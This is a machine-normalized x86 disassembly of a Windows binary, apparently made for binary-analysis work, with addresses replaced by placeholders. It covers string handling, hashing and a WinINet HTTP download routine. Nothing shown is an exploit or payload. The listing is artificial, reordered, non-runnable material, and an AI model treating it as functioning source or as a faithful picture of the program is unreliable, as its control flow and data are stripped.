lea ecx [ ebp - 0x2c ]
call sub_418af2
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_41a87b
sub_40ea60
push ebp
mov ebp esp
push 0xffffffff
push sub_43079b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test edi edi
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_41775f
mov esi eax
add esp 0x4
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x44 ]
call sub_4089f0
mov eax [ ecx + 0x18 ]
test eax eax
jne r-xdata
mov eax r--data
jmp r-xdata
push eax
lea ecx [ ebp - 0x44 ]
call sub_408920
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
jmp r-xdata
lea eax [ ecx + 0x1c ]
mov [ edi ] esi
test bl 0x1
je r-xdata
sub_40eb10
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
or edi 0xffffffff
cmp [ ebx + 0x10 ] 0xffffffff
mov esi ecx
cmovb edi [ ebx + 0x10 ]
mov edx [ esi + 0x10 ]
or eax 0xffffffff
sub eax edx
cmp eax edi
jbe r-xdata
push r--data
call sub_41682d
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
lea eax [ edx + edi ]
mov [ ebp + 0xc ] eax
cmp eax 0xfffffffe
ja r-xdata
push r--data
call sub_41682d
mov ecx [ esi + 0x14 ]
cmp ecx eax
jae r-xdata
test eax eax
jne r-xdata
push edx
push eax
mov ecx esi
call sub_4018d0
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] eax
cmp ecx 0x10
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x10
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp esi ebx
jne r-xdata
push ecx
push edx
add eax edi
push eax
call sub_4170d0
add esp 0xc
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ebx [ ebx ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
push [ ebp + 0xc ]
mov ecx esi
call sub_4017d0
push edi
push ebx
push eax
call sub_41a1a0
test edi edi
je r-xdata
push edi
push ecx
push eax
call sub_4170d0
jmp r-xdata
test edi edi
je r-xdata
add esp 0xc
sub_40ec40
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push edi
mov edx [ esi + 0x10 ]
mov edi [ ebp + 0x8 ]
cmp edx edi
jb r-xdata
push r--data
call sub_41685b
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ eax + 0x10 ]
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ ebp + 0xc ]
mov ecx edx
sub ecx edi
cmp ecx eax
cmovb eax ecx
sub ebx [ ebp + 0x14 ]
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0x18 ]
cmp [ ebp - 0x4 ] ebx
mov [ ebp + 0x18 ] edx
cmovb ebx [ ebp - 0x4 ]
sub [ ebp + 0x18 ] eax
or eax 0xffffffff
sub eax ebx
cmp eax [ ebp + 0x18 ]
jbe r-xdata
push r--data
call sub_41682d
mov eax [ ebp + 0x18 ]
sub ecx [ ebp + 0xc ]
add eax ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x18 ] eax
cmp edx eax
jae r-xdata
mov eax [ ebp + 0x10 ]
cmp esi eax
je r-xdata
cmp eax 0xfffffffe
ja r-xdata
mov edx [ ebp + 0xc ]
cmp ebx edx
ja r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x10
jb r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax [ ebp + 0x18 ]
jae r-xdata
cmp [ ebp + 0x14 ] edi
ja r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ ebp - 0x4 ] esi
mov edi [ esi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push edx
push [ ebp + 0x18 ]
mov ecx esi
call sub_4018d0
mov ecx [ ebp - 0x4 ]
jmp r-xdata
lea eax [ edi + edx ]
cmp eax [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
ja r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ ebp + 0x8 ] esi
mov ecx [ esi ]
mov [ ebp + 0x8 ] ecx
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov [ esi + 0x10 ] 0x0
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
mov [ ebp + 0x8 ] esi
mov edx [ esi ]
mov [ ebp + 0x8 ] edx
mov edx [ ebp + 0xc ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp - 0x4 ]
add eax edi
add eax [ ebp + 0xc ]
push ecx
push eax
lea eax [ edx + edi ]
add eax ebx
push eax
call sub_4170d0
mov eax [ ebp + 0x10 ]
add esp 0xc
test ecx ecx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ ebp + 0x10 ] esi
mov ecx [ esi ]
mov [ ebp + 0x10 ] ecx
jmp r-xdata
mov [ ebp + 0x8 ] esi
mov edx [ esi ]
mov [ ebp + 0x8 ] edx
mov edx [ ebp + 0xc ]
jmp r-xdata
mov [ ebp + 0xc ] esi
mov eax [ esi ]
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0x14 ]
push ebx
push eax
lea eax [ ecx + edi ]
push eax
call sub_4170d0
mov edx [ ebp + 0xc ]
add esp 0xc
test ebx ebx
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ eax ]
mov [ eax ] 0x0
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov [ ebp + 0x10 ] esi
mov eax [ esi ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
add eax edi
add eax edx
push ecx
push eax
mov eax [ ebp + 0xc ]
add eax edi
add eax ebx
push eax
call sub_4170d0
add esp 0xc
test ecx ecx
je r-xdata
mov [ ebp + 0xc ] esi
mov ecx [ esi ]
mov [ ebp + 0xc ] ecx
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0x14 ]
push edx
push eax
lea eax [ ecx + edi ]
push eax
call sub_4170d0
mov edx [ ebp + 0xc ]
add esp 0xc
test edx edx
je r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
add eax edi
add eax edx
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax edi
add eax ebx
push eax
call sub_4170d0
mov edx [ ebp + 0xc ]
add esp 0xc
test ecx ecx
je r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
mov ecx [ ebp + 0x18 ]
mov [ esi + 0x10 ] ecx
pop ebx
jb r-xdata
add eax [ ebp + 0x14 ]
push ebx
push eax
lea eax [ ecx + edi ]
push eax
call sub_41a1a0
jmp r-xdata
test ebx ebx
je r-xdata
mov [ ebp + 0x10 ] esi
mov ecx [ esi ]
mov [ ebp + 0x10 ] ecx
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
push eax
mov eax [ ebp + 0xc ]
add eax edi
add eax edx
push eax
lea eax [ ecx + edi ]
add eax ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax esi
pop edi
mov [ eax + ecx ] 0x0
pop esi
mov esp ebp
pop ebp
retn 0x14
mov eax [ esi ]
pop edi
mov [ eax + ecx ] 0x0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x14
add esp 0xc
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov eax [ ebp + 0x14 ]
add eax edx
push ebx
push eax
lea eax [ ecx + edi ]
jmp r-xdata
test ebx ebx
je r-xdata
push eax
call sub_4170d0
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
push eax
mov eax [ ebp + 0x10 ]
add eax edi
add eax edx
push eax
lea eax [ ecx + edi ]
add eax ebx
push eax
call sub_4170d0
add esp 0xc
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub eax edx
add eax [ ebp + 0x14 ]
push ebx
add eax ebx
push eax
lea eax [ ecx + edi ]
jmp r-xdata
test ebx ebx
je r-xdata
mov [ ebp + 0x10 ] esi
mov ecx [ esi ]
mov [ ebp + 0x10 ] ecx
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
push eax
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0x14 ]
add eax ebx
push eax
mov eax edi
add eax edx
add eax ecx
mov ecx [ ebp + 0xc ]
mov eax ebx
sub eax ecx
je r-xdata
sub_40efd0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0xc ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ eax + 0x10 ]
mov [ esp + 0xc ] ecx
mov ecx [ eax + 0x14 ]
push esi
push edi
mov [ esp + 0x10 ] eax
mov [ esp + 0x1c ] ecx
cmp ecx 0x10
jb r-xdata
mov esi eax
mov esi [ eax ]
jmp r-xdata
mov ebx [ esp + 0x14 ]
mov esi [ ebx + 0x14 ]
mov ecx esi
and ecx edx
cmp [ ebx + 0x18 ] ecx
ja r-xdata
lea esp [ esp ]
xor ecx ecx
mov edx 0x811c9dc5
test ebx ebx
je r-xdata
mov edi [ ebx ]
shl ecx 0x3
mov [ esp + 0x28 ] ecx
add ecx [ ebx + 0x8 ]
mov eax [ ecx ]
mov [ esp + 0x24 ] eax
cmp edi eax
je r-xdata
shr esi 0x1
or eax 0xffffffff
sub eax esi
add ecx eax
movzx eax [ ecx + esi ]
xor edx eax
inc ecx
imul edx edx 0x1000193
cmp ecx ebx
jb r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ esi ]
cmp edi eax
je r-xdata
mov edi [ ecx + 0x4 ]
mov edi [ edi ]
cmp edi eax
je r-xdata
mov ecx [ ebx + 0x8 ]
mov edx [ esp + 0x28 ]
add ecx edx
mov eax [ ecx ]
cmp eax [ ebx ]
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] edi
mov ecx [ edi + 0x4 ]
mov [ ecx ] esi
mov ecx [ eax + 0x4 ]
mov edx [ edi + 0x4 ]
mov [ edi + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov [ esi + 0x4 ] edx
mov edi [ edi + 0x4 ]
cmp [ edi + 0x1c ] 0x10
mov edx [ edi + 0x18 ]
lea ecx [ edi + 0x8 ]
mov [ esp + 0x20 ] edx
jb r-xdata
cmp eax edi
jne r-xdata
mov [ ecx ] esi
mov eax [ ebx + 0x8 ]
mov [ eax + edx + 0x4 ] esi
jmp r-xdata
cmp [ esp + 0x1c ] 0x10
mov ebx [ esp + 0x10 ]
jb r-xdata
mov ecx [ ecx ]
mov eax [ ecx + 0x4 ]
mov eax [ eax ]
mov [ ecx + 0x4 ] eax
cmp eax esi
je r-xdata
mov [ ecx ] esi
jmp r-xdata
mov ecx ebx
call sub_40f2a0
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x2c ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
xor ecx esp
mov [ eax + 0x4 ] 0x1
call sub_4170bc
mov esp ebp
pop ebp
retn 0xc
mov eax [ esp + 0x10 ]
mov esi edx
cmp [ eax + 0x10 ] edx
cmovb esi [ eax + 0x10 ]
mov eax [ esp + 0x24 ]
test esi esi
je r-xdata
mov ebx [ ebx ]
mov ecx [ ebx + 0x8 ]
mov eax [ ecx + edx + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ecx + edx + 0x4 ] eax
mov esi [ esp + 0x10 ]
mov ebx [ esi + 0x10 ]
cmp ebx edx
jae r-xdata
sub esi 0x4
jb r-xdata
xor ecx ecx
cmp ebx edx
setne cl
or ecx 0xffffffff
jmp r-xdata
cmp esi 0xfffffffc
je r-xdata
lea ecx [ ecx ]
lea eax [ edi + 0x8 ]
push esi
push eax
call sub_40dad0
test al al
je r-xdata
cmp edi eax
jne r-xdata
test ecx ecx
sete cl
test cl cl
sete cl
test cl cl
je r-xdata
xor ecx ecx
mov dl [ ebx ]
cmp dl [ ecx ]
jne r-xdata
add ebx 0x4
add ecx 0x4
sub esi 0x4
jae r-xdata
push [ ebp + 0x10 ]
mov ecx [ esp + 0x18 ]
call sub_40f240
mov eax [ esp + 0x18 ]
mov [ eax ] edi
mov [ eax + 0x4 ] 0x0
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_4170bc
mov esp ebp
pop ebp
retn 0xc
mov edi [ edi ]
jmp r-xdata
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x20 ]
mov esi [ esp + 0x10 ]
jmp r-xdata
sbb ecx ecx
or ecx 0x1
jmp r-xdata
cmp esi 0xfffffffd
je r-xdata
mov edx [ ebx ]
cmp edx [ ecx ]
jne r-xdata
test ecx ecx
je r-xdata
mov dl [ ebx + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
cmp esi 0xfffffffe
je r-xdata
mov dl [ ebx + 0x2 ]
cmp dl [ ecx + 0x2 ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov dl [ ebx + 0x3 ]
cmp dl [ ecx + 0x3 ]
je r-xdata
sub_40f210
push ebp
mov ebp esp
test edx edx
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
add ecx 0x4
dec edx
jne r-xdata
mov eax [ esi ]
mov [ ecx ] eax
pop esi
sub_40f240
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp esi [ edi ]
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov [ ecx ] eax
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
cmp [ esi + 0x1c ] 0x10
jb r-xdata
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x18 ] 0x0
push esi
mov [ esi + 0x8 ] 0x0
call j_sub_417912#2
add esp 0x4
dec [ edi + 0x4 ]
push [ esi + 0x8 ]
call j_sub_417912#2
add esp 0x4
sub_40f2a0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx ecx
push esi
mov eax [ ebx + 0x4 ]
mov esi [ ebx + 0x18 ]
movd xmm0 eax
cvtdq2pd xmm0 xmm0
shr eax 0x1f
push edi
addsd xmm0 [ eax * 8 + r--data ]
mov eax esi
shr eax 0x1f
cvtpd2ps xmm1 xmm0
movd xmm0 esi
cvtdq2pd xmm0 xmm0
addsd xmm0 [ eax * 8 + r--data ]
cvtpd2ps xmm0 xmm0
divss xmm1 xmm0
comiss xmm1 [ ebx + 0x1c ]
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x200
jae r-xdata
cmp esi 0x1fffffff
jae r-xdata
shl esi 0x3
jmp r-xdata
mov eax [ ebx ]
lea edx [ ebp - 0x4 ]
push edx
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ecx ]
lea edx [ esi + esi ]
push edx
push eax
mov [ ecx + 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_40ddf0
mov edi [ ebx ]
lea eax [ esi - 0x1 ]
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x18 ] esi
cmp [ edi ] edi
je r-xdata
add esi esi
mov edi [ edi + 0x4 ]
mov esi [ ebx ]
mov ecx ebx
mov esi [ esi ]
push esi
lea eax [ esi + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40efd0
cmp esi edi
jne r-xdata
sub_40f360
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
cmp esi edx
je r-xdata
pop esi
pop ebp
retn
lea ecx [ ecx ]
add esi 0x4
add eax 0x4
cmp esi edx
jne r-xdata
mov ecx [ esi ]
mov [ eax ] ecx
test eax eax
je r-xdata
sub_40f390
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e000
mov esi eax
lea ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0xc
push ecx
push [ ebp + 0x10 ]
call sub_40f3c0
mov eax esi
sub_40f3c0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
cmp [ esi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ esi ] 0x0
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov eax [ esi + 0x18 ]
mov [ edi + 0x18 ] eax
mov eax edi
pop edi
pop esi
pop ebp
retn 0x8
push eax
push esi
push edi
call sub_4170d0
add esp 0xc
jmp r-xdata
sub_40f460
push ebp
mov ebp esp
push 0xffffffff
push sub_430a22
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edx
mov [ ebp - 0x18 ] edi
mov esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x0
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push r--data
mov [ ebp - 0x3c ] esi
mov [ esi ] 0x0
call sub_401630
mov [ ebp - 0x4 ] 0x0
mov ecx [ edi + 0x10 ]
xor eax eax
mov ebx 0x1
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x14 ] eax
test ecx ecx
jle r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add ecx 0xfffffffc
mov [ ebp - 0x20 ] ecx
xor bl bl
push 0x5
push eax
push edi
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x24 ] 0xf
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x38 ] 0x0
call sub_401500
or ebx 0x2
cmp [ ebp - 0x24 ] 0x10
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x28 ]
lea edx [ ebp - 0x38 ]
cmovae edx [ ebp - 0x38 ]
mov ecx 0x5
cmp ebx ecx
cmovb ecx ebx
test ecx ecx
je r-xdata
test bl bl
je r-xdata
and eax 0xfffffffd
cmp [ ebp - 0x24 ] 0x10
mov [ ebp - 0x10 ] eax
jb r-xdata
cmp ebx 0x5
jae r-xdata
mov edi r--data
sub ecx 0x4
jb r-xdata
mov edi [ ebp - 0x18 ]
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov ecx [ esi + 0x10 ]
or eax 0xffffffff
sub eax ecx
cmp eax 0x1
jbe r-xdata
push [ ebp - 0x38 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp ebx 0x5
setne al
or eax 0xffffffff
jmp r-xdata
cmp ecx 0xfffffffc
je r-xdata
mov eax [ edx ]
cmp eax [ edi ]
jne r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
push r--data
call sub_41682d
lea edi [ ecx + 0x1 ]
cmp edi 0xfffffffe
ja r-xdata
mov bl 0x1
jmp r-xdata
test eax eax
xor eax eax
mov al [ edx ]
cmp al [ edi ]
jne r-xdata
add edx 0x4
add edi 0x4
sub ecx 0x4
jae r-xdata
mov ebx [ ebp - 0x10 ]
mov ecx [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x14 ]
movzx eax [ eax + ecx ]
push eax
push 0x1
mov ecx esi
call sub_40c840
mov eax [ ebp - 0x14 ]
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
test al 0x2
je r-xdata
sete al
test al al
je r-xdata
sbb eax eax
or eax 0x1
jmp r-xdata
cmp ecx 0xfffffffd
je r-xdata
cmp eax ecx
jge r-xdata
test edi edi
jne r-xdata
push ecx
push edi
mov ecx esi
call sub_4018d0
test edi edi
je r-xdata
test eax eax
jne r-xdata
mov al [ edx + 0x1 ]
cmp al [ edi + 0x1 ]
jne r-xdata
cmp [ esi + 0x14 ] 0x10
mov ecx [ esi + 0x10 ]
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0x14 ]
mov edi [ ebp - 0x18 ]
add eax 0x4
jmp r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edi [ ebp - 0x18 ]
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp - 0x14 ]
add eax 0x4
jmp r-xdata
mov eax [ esi ]
mov edi [ ebp - 0x18 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x14 ]
add eax 0x4
jmp r-xdata
inc eax
mov [ ebp - 0x14 ] eax
cmp eax [ ebp - 0x1c ]
jge r-xdata
mov al [ edx + 0x2 ]
cmp al [ edi + 0x2 ]
jne r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp - 0x14 ]
mov edi [ ebp - 0x18 ]
add eax 0x4
jmp r-xdata
mov [ eax + ecx ] 0x2b
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
cmp ecx 0xffffffff
je r-xdata
mov al [ edx + 0x3 ]
cmp al [ edi + 0x3 ]
je r-xdata
sub_40f6d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4309c2
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0xcd5c
call sub_421de0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x18 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor eax eax
push eax
push r--data
lea ecx [ ebp - 0xccb8 ]
mov [ ebp - 0xcd2c ] ebx
mov [ ebp - 0xcd38 ] 0x0
mov [ ebp - 0xcca4 ] 0x7
mov [ ebp - 0xcca8 ] 0x0
mov [ ebp - 0xccb8 ] ax
call sub_408240
xor eax eax
push 0x206
mov [ ebp - 0x4 ] 0x0
push eax
mov [ ebp - 0x46c ] ax
lea eax [ ebp - 0x46a ]
push eax
call sub_41cae0
add esp 0xc
xor eax eax
push 0x206
push eax
mov [ ebp - 0x264 ] ax
lea eax [ ebp - 0x262 ]
push eax
call sub_41cae0
add esp 0xc
lea eax [ ebp - 0xcd1c ]
push 0x3c
push 0x0
push eax
call sub_41cae0
lea eax [ ebp - 0x46c ]
mov [ ebp - 0xcd0c ] eax
lea eax [ ebp - 0x264 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ ebp - 0xccf0 ] eax
mov eax [ esi + 0x10 ]
mov [ ebp - 0xcd1c ] 0x3c
mov [ ebp - 0xcce8 ] 0x0
mov [ ebp - 0xcce4 ] 0x0
mov [ ebp - 0xcd08 ] 0x103
mov [ ebp - 0xccf8 ] 0x0
mov [ ebp - 0xccf4 ] 0x0
mov [ ebp - 0xcd18 ] 0x0
mov [ ebp - 0xcd14 ] 0x0
mov [ ebp - 0xccec ] 0x103
jb r-xdata
lea ecx [ ebp - 0xcd1c ]
push ecx
push 0x80000000
push eax
push esi
call [ InternetCrackUrlW@IAT ]
test eax eax
jne r-xdata
mov esi [ esi ]
mov [ ebp - 0xcd34 ] 0x0
mov [ ebp - 0xcd30 ] 0x0
mov [ ebp - 0xcd1d ] 0x1
mov [ ebp - 0xcc88 ] 0xf
mov [ ebp - 0xcc8c ] 0x0
mov [ ebp - 0xcc9c ] 0x0
push 0x0
push 0x0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0xcca4 ] 0x8
push 0x0
lea eax [ ebp - 0xccb8 ]
cmovae eax [ ebp - 0xccb8 ]
push 0x0
push eax
call [ InternetOpenW@IAT ]
mov [ ebp - 0xcd28 ] eax
test eax eax
jne r-xdata
push eax
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] eax
push r--data
mov ecx ebx
mov [ ebx ] al
call sub_401630
cmp [ ebp - 0xcca4 ] 0x8
jb r-xdata
push 0x0
push 0x0
push 0x3
push r--data
push r--data
push 0x0
lea ecx [ ebp - 0x46c ]
push ecx
push eax
call [ InternetConnectW@IAT ]
mov [ ebp - 0xcd34 ] eax
test eax eax
jne r-xdata
lea eax [ ebp - 0xcd24 ]
push eax
lea ecx [ ebp - 0xcd5c ]
mov [ ebp - 0xcd24 ] r--data
call sub_418b0e
push r--data
lea eax [ ebp - 0xcd5c ]
push eax
call sub_41a87b
mov eax ebx
push [ ebp - 0xccb8 ]
call j_sub_417912#2
add esp 0x4
jmp r-xdata
push 0x0
push 0x80000100
push 0x0
push 0x0
push r--data
lea ecx [ ebp - 0x264 ]
push ecx
push r--data
push eax
call [ HttpOpenRequestW@IAT ]
mov edi eax
mov [ ebp - 0xcd30 ] edi
test edi edi
jne r-xdata
lea eax [ ebp - 0xcd24 ]
push eax
lea ecx [ ebp - 0xcd68 ]
mov [ ebp - 0xcd24 ] r--data
call sub_418b0e
push r--data
lea eax [ ebp - 0xcd68 ]
push eax
call sub_41a87b
push 0x0
push 0x0
push 0x0
push 0x0
push edi
call [ HttpSendRequestW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xcd24 ]
push eax
lea ecx [ ebp - 0xcd44 ]
mov [ ebp - 0xcd24 ] r--data
call sub_418b0e
push r--data
lea eax [ ebp - 0xcd44 ]
push eax
call sub_41a87b
push 0x0
lea eax [ ebp - 0xcca0 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
push 0x5
push edi
mov [ ebp - 0xcca0 ] 0x40
call [ HttpQueryInfoW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xcd24 ]
push eax
lea ecx [ ebp - 0xcd50 ]
mov [ ebp - 0xcd24 ] r--data
call sub_418b0e
push r--data
lea eax [ ebp - 0xcd50 ]
push eax
call sub_41a87b
mov esi 0xc800
lea eax [ ebp - 0x5c ]
push eax
call sub_41832c
add esp 0x4
mov esi eax
jmp r-xdata
mov eax [ ebp - 0xccbc ]
add [ ebp - 0xcd24 ] eax
sub esi eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0xcd1d ] 0x0
mov [ ebp - 0xcd24 ] 0x0
mov ecx 0xc800
lea ecx [ ecx ]
mov [ ebp - 0x4 ] 0x1
mov esi [ InternetCloseHandle@IAT ]
test edi edi
je r-xdata
push eax
lea eax [ ebp - 0xcc6c ]
push eax
lea ecx [ ebp - 0xcc9c ]
call sub_40d810
mov ecx 0xc800
test esi esi
jg r-xdata
mov eax [ ebp - 0xcd34 ]
test eax eax
